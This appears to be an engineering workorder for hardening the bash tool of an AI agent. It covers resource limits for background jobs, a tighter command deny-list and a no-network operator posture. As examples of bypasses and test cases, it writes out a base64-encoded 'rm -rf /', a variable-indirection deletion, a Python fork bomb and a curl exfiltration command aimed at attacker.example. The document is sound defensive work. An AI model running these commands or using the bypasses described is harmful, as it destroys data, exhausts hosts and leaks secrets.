# Workorder 27.5 — Bash Hardening: Background Jobs + Deny-List Posture (H3/H5)

## Status: Done (rlimits + network namespace via WO 28.5; deny-list tripwire via WO 28.17)

## Problem

Two related findings once C1 (landlock) lands:
- **H5 — Background bash jobs skip ALL resource limits.** `src/session/bash_jobs.rs:163-180` builds the `Command` with only `setup_process_group` + `kill_on_drop(true)` — no rlimits, no network namespace, no landlock. A `bash` call with `background: true` (or the equivalent Python fork bomb) has no in-process limit. The foreground path (`run_shell_with_token`) correctly calls `setup_rlimits`; the background path doesn't.
- **H3 — Bash deny-list is fundamentally bypassable.** `src/session/bash_runner/safety.rs:280-438` (`check_bash_command_str`) is a curated blocklist. Gaps observed: `$()` command substitution not detected (only `${IFS`, `$IFS`, `$'`); variable assignment indirection (`x=/; rm -rf $x`) passes; base64/hex payloads (`eval $(echo cm0gLXJmIC8K | base64 -d)`) not blocked. Acceptable as defense-in-depth alongside a real sandbox (27.1); alone it's the only barrier.

## Reality-check (verified 2026-08-11)

- `setup_rlimits` applies `RLIMIT_CPU`, `RLIMIT_AS`, `RLIMIT_FSIZE`, and optionally `unshare(CLONE_NEWNET)` — but only on the foreground path.
- The deny-list has good coverage of literal patterns + several evasion classes; the gaps are the inherent limit of substring/regex blocklists.
- H3 depends on H5/27.1 — without a sandbox, the deny-list IS the boundary; with one, it's a tripwire.

## Scope

### R1 — Apply `setup_rlimits` to background bash jobs
- `src/session/bash_jobs.rs:163-180` — the `Command` builder for background spawns should call the same `setup_rlimits(pre_exec, SandboxConfig)` as the foreground path. Plumb the `SandboxConfig` through the background spawn API.
- Verify rlimits apply to the spawned shell + its children (rlimits are per-process inherited).
- Test: a background `python3 -c "import os; [os.fork() for _ in iter(int,0)]"` (fork bomb) gets killed by SIGXCPU/SIGSEGV within the CPU/memory cap, not by exhausting the host.

### R2 — Tighten the deny-list (narrow the bypass surface)
- `src/session/bash_runner/safety.rs:156` `contains_shell_expansion_evasion` — add detection for `$(`, backticks, and `<(` process substitution. Note this only narrows the surface; a determined payload can still evade via encoding. Comment honestly (`ponytail: blocklist narrows the surface; the real boundary is landlock per WO 27.1`).
- Add the Python/Node one-liner fork-bomb patterns to the literal deny-list.

### R3 — Document the `--harden --no-network` posture for headless
- `docs/TECHNICAL.md` + `README.md` operator section — recommend `--harden --no-network` for unattended runs. Explain that `unshare(CLONE_NEWNET)` (the `no_network` flag) is the only thing blocking `curl -F f=@sensitive https://attacker.example/` exfiltration until 27.1 + egress control land.
- Consider defaulting `no_network = true` for `--non-interactive` mode (separate config field; opt-out for tools that legitimately need network).

## Success criteria

1. A background bash fork bomb is killed by rlimits within seconds, not by host OOM.
2. The deny-list catches `$(` / backticks / `<(` (with tests).
3. Operator docs recommend `--harden --no-network` for headless; the flag combination works.
4. `safety.rs` + `bash_jobs.rs` tests pass; the existing cargo-spawning verifier tests still work (they spawn cargo, which needs to NOT be rlimit-killed — verify the rlimits are generous enough for a real build).

## Failure criteria

- Applying rlimits so tight that legitimate background jobs (cargo build, npm install) fail.
- Treating the deny-list as a real boundary in user-facing docs (it's a tripwire; landlock per 27.1 is the boundary).
- Breaking the 30+ existing `safety.rs` evasion tests.

## Estimate

## Defer note

This whole workorder is defense-in-depth BEHIND the landlock sandbox (WO 27.1). Do not ship R1/R2 as the primary safety story — they're the second layer. If 27.1 slips, 27.5 R3 (document `--harden --no-network` as the interim operator posture) is the only piece that ships standalone.
